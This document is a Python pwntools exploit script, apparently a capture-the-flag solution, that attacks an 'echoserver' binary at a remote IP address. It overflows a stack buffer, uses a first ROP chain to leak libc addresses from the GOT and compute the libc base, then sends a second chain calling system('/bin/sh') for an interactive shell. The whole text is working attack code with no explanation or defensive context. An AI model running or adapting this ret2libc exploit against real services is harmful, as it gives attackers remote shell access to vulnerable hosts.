
from pwn import *

elf = ELF("./echoserver_2aa0a5dae5b5c2954ea6917acd01f49b")
libc = ELF("./libc6_2.31-0ubuntu9_amd64.so")

context.binary = elf
run = remote("125.235.240.166", 20101)

main = p64(0x004011ae)
string = b"QUIT"

# First ropchain
puts_plt = p64(elf.plt['puts'])
puts_got = p64(elf.got['puts'])
gets_got = p64(elf.got['gets'])
pop_rdi = p64(0x00000000004012cb)

ropchain1 = b'A' * 0x84 + string
ropchain1 += pop_rdi + puts_got + puts_plt
ropchain1 += pop_rdi + gets_got + puts_plt + main

run.sendline(ropchain1)

# Read leaked addresses
run.recvuntil(b"\n")
leaked_puts = u64(run.recvline().strip().ljust(8, b'\x00'))
leaked_gets = u64(run.recvline().strip().ljust(8, b'\x00'))

log.info("Leaked puts address = " + hex(leaked_puts))
log.info("Leaked gets address = " + hex(leaked_gets))

# Calculate libc base address
libc.address = leaked_puts - libc.sym['puts']
log.info("Libc base = " + hex(libc.address))

# Second ropchain
bin_sh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']

log.info("/bin/sh = " + hex(bin_sh))
log.info("system = " + hex(system))

ropchain2 = b'A' * 0x84 + string + pop_rdi + p64(bin_sh) + p64(system)

run.sendline(ropchain2)

run.interactive()